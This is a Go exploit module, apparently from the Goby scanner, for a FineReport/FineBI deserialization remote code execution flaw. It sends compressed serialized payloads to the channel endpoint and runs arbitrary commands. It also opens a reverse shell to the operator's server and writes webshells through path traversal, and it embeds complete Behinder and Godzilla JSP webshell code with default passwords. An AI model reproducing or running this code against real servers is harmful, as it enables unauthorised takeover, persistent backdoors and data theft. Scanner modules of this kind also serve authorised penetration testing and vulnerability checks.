package exploits

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "FineReport/FineBI channel  remote code execution vulnerability",
    "Description": "<p>FineReport and FineBI are enterprise-level report design and data analysis tools and business intelligence platforms developed by Fanruan Software.</p><p>FineReport and FineBI have deserialization vulnerabilities. An attacker can send carefully constructed deserialized data to the /webroot/decision/remote/design/channel interface to execute arbitrary code on the target server and obtain server permissions.</p>",
    "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://help.fanruan.com/finereport/doc-view-4833.html\">https://help.fanruan.com/finereport/doc-view-4833.html</a></p>",
    "Product": "FineReport",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "FineReport/FineBI channel 远程代码执行漏洞",
            "Product": "帆软-FineReport",
            "Description": "<p>FineReport、FineBI 是帆软软件开发的企业级报表设计和数据分析工具与商业智能平台。</p><p><span style=\"color: var(--primaryFont-color);\">FineReport、FineBI 存在反序列化漏洞，攻击者可向 /webroot/decision/remote/design/channel 接口发送精心构造的反序列化数据，在目标服务器上执行任意代码，获取服务器权限。</span></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://help.fanruan.com/finereport/doc-view-4833.html\">https://help.fanruan.com/finereport/doc-view-4833.html</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "FineReport/FineBI channel  remote code execution vulnerability",
            "Product": "FineReport",
            "Description": "<p>FineReport and FineBI are enterprise-level report design and data analysis tools and business intelligence platforms developed by Fanruan Software.</p><p>FineReport and FineBI have deserialization vulnerabilities. An attacker can send carefully constructed deserialized data to the /webroot/decision/remote/design/channel interface to execute arbitrary code on the target server and obtain server permissions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://help.fanruan.com/finereport/doc-view-4833.html\">https://help.fanruan.com/finereport/doc-view-4833.html</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "body=\"/webroot/decision/\" || body=\"content=\\\"FineReport--Web Reporting Tool\\\"\" || title=\"FineReport\" || title=\"FineReport报表\" || title=\"FineBI\"",
    "GobyQuery": "body=\"/webroot/decision/\" || body=\"content=\\\"FineReport--Web Reporting Tool\\\"\" || title=\"FineReport\" || title=\"FineReport报表\" || title=\"FineBI\"",
    "Author": "su18@javaweb.org",
    "Homepage": "http://www.fanruansem.com/",
    "DisclosureDate": "2022-08-01",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,webshell,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.jsp",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PostTime": "2023-09-27",
    "PocId": "10704"
}`

	payloadHibernate1xTomcatEcho2e357e0f := ""
	payloadCB2xTomcatEchofb01aee7 := ""

	sendPayloadad28d973 := func(u *httpclient.FixUrl, data string, cmd string) (*httpclient.HttpResponse, error) {
		var buf bytes.Buffer
		cfg := httpclient.NewPostRequestConfig("/webroot/decision/remote/design/channel")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Cmd", cmd)
		payload, err := base64.StdEncoding.DecodeString(data)
		if err != nil {
			return nil, err
		}
		gzipWriter := gzip.NewWriter(&buf)
		defer gzipWriter.Close()
		if _, err = gzipWriter.Write(payload); err != nil {
			return nil, err
		}
		if err = gzipWriter.Flush(); err != nil {
			return nil, err
		}
		cfg.Data = string(buf.Bytes())
		return httpclient.DoHttpRequest(u, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(6)
			for _, payload := range []string{payloadHibernate1xTomcatEcho2e357e0f, payloadCB2xTomcatEchofb01aee7} {
				rsp, err := sendPayloadad28d973(u, payload, "echo "+checkStr)
				if err != nil {
					return false
				} else if strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, "echo "+checkStr) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "cmd" {
				cmd := goutils.B2S(ss.Params["cmd"])
				for _, payload := range []string{payloadHibernate1xTomcatEcho2e357e0f, payloadCB2xTomcatEchofb01aee7} {
					rsp, err := sendPayloadad28d973(expResult.HostInfo, payload, cmd)
					if err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					} else if res := rsp.Utf8Html[:strings.Index(rsp.RawBody, "\x1f\x8b")]; res != "" {
						expResult.Success = true
						expResult.Output = res
						return expResult
					}
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_windows", waitSessionCh)
				if err != nil || len(rp) == 0 {
					expResult.Success = false
					expResult.Output = err.Error()
				} else {
					for _, payload := range []string{payloadHibernate1xTomcatEcho2e357e0f, payloadCB2xTomcatEchofb01aee7} {
						sendPayloadad28d973(expResult.HostInfo, payload, "#####"+godclient.GodServerAddr+":"+rp)
						select {
						case webConsoleId := <-waitSessionCh:
							if u, err := url.Parse(webConsoleId); err == nil {
								expResult.Success = true
								expResult.OutputType = "html"
								expResult.Output = `<br/> <a href="goby://sessions/view?sid=` + strings.Join(u.Query()["id"], "") + `&key=` + godclient.GetKey() + `">open shell</a>`
								return expResult
							}
						case <-time.After(time.Second * 20):
							expResult.Success = false
							expResult.Output = "漏洞利用失败"
						}
					}
				}
			} else if attackType == "webshell" {
				webshell := goutils.B2S(ss.Params["webshell"])
				content := goutils.B2S(ss.Params["content"])
				filename := goutils.RandomHexString(8) + ".jsp"
				if webshell == "behinder" {
					//该密钥为连接密码 32 位 md5 值的前 16 位，默认连接密码 rebeyond
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){} %>`
				} else {
					filename = goutils.B2S(ss.Params["filename"])
				}
				savePathMap := map[string]string{
					`../webapps/webroot/` + filename:         "/webroot/" + filename,
					`../webapps/webroot/scripts/` + filename: "/webroot/scripts/" + filename,
					`./webapps/webroot/` + filename:          "/webroot/" + filename,
					`./webapps/webroot/scripts/` + filename:  "/webroot/scripts/" + filename,
				}
				for _, payload := range []string{payloadHibernate1xTomcatEcho2e357e0f, payloadCB2xTomcatEchofb01aee7} {
					for path := range savePathMap {
						_, err := sendPayloadad28d973(expResult.HostInfo, payload, "$$$$$"+path+":"+base64.StdEncoding.EncodeToString([]byte(content)))
						if err != nil {
							expResult.Success = false
							expResult.Output = err.Error()
							return expResult
						}
						cfgCheck := httpclient.NewGetRequestConfig(savePathMap[path])
						cfgCheck.VerifyTls = false
						cfgCheck.FollowRedirect = false
						rspCheck, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgCheck)
						if err != nil {
							expResult.Success = false
							expResult.Output = err.Error()
							return expResult
						} else if rspCheck.StatusCode == 200 || rspCheck.StatusCode == 500 {
							expResult.Success = true
							expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rspCheck.Request.URL.Path + "\n"
							if webshell == "behinder" {
								expResult.Output += "Password: rebeyond\n"
								expResult.Output += "WebShell tool: Behinder v3.0\n"
							} else if webshell == "godzilla" {
								expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
								expResult.Output += "WebShell tool: Godzilla v4.1\n"
							}
							expResult.Output += "Webshell type: jsp"
							return expResult
						}
					}
				}
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
